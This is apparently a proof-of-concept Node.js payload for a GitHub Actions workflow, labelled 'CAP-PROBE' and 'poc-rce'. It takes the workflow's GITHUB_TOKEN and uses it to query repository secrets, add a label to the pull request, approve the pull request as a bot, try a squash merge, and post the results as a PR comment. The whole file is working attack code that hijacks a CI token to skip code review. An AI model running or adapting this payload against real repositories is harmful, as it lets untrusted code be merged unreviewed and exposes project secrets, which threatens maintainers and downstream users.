const fs = require('fs');
const path = require('path');
(async () => {
  const token = process.env.GITHUB_TOKEN || '';
  const repo = process.env.GITHUB_REPOSITORY || '';
  const ws = process.env.GITHUB_WORKSPACE || process.cwd();
  let pr = '';
  try { pr = fs.readFileSync(path.join(ws, 'pr-number.txt'), 'utf8').trim(); } catch (e) {}
  const H = { authorization: 'Bearer ' + token, accept: 'application/vnd.github+json', 'content-type': 'application/json', 'x-github-api-version': '2022-11-28' };
  const out = ['CAP-PROBE wf=' + process.env.GITHUB_WORKFLOW + ' event=' + process.env.GITHUB_EVENT_NAME + ' pr=' + pr + ' token_len=' + token.length];
  async function call(method, url, body) {
    try {
      const r = await fetch('https://api.github.com' + url, { method, headers: H, body: body ? JSON.stringify(body) : undefined });
      const t = await r.text();
      out.push(method + ' ' + url + ' -> ' + r.status + ' ' + t.slice(0, 160).replace(/\n/g, ' '));
    } catch (e) { out.push(method + ' ' + url + ' ERR ' + e.message); }
  }
  await call('GET', '/repos/' + repo);
  await call('GET', '/repos/' + repo + '/actions/secrets');
  await call('POST', '/repos/' + repo + '/issues/' + pr + '/labels', { labels: ['poc-rce'] });
  await call('POST', '/repos/' + repo + '/pulls/' + pr + '/reviews', { event: 'APPROVE', body: 'poc approve by bot' });
  await call('PUT', '/repos/' + repo + '/pulls/' + pr + '/merge', { merge_method: 'squash' });
  const text = out.join('\n');
  console.log(text);
  try { fs.writeFileSync(path.join(ws, 'CAP-RESULT.txt'), text); } catch (e) {}
  try {
    await fetch('https://api.github.com/repos/' + repo + '/issues/' + pr + '/comments', {
      method: 'POST', headers: H,
      body: JSON.stringify({ body: 'CAP-RESULT\n```\n' + text + '\n```' })
    });
  } catch (e) {}
})();
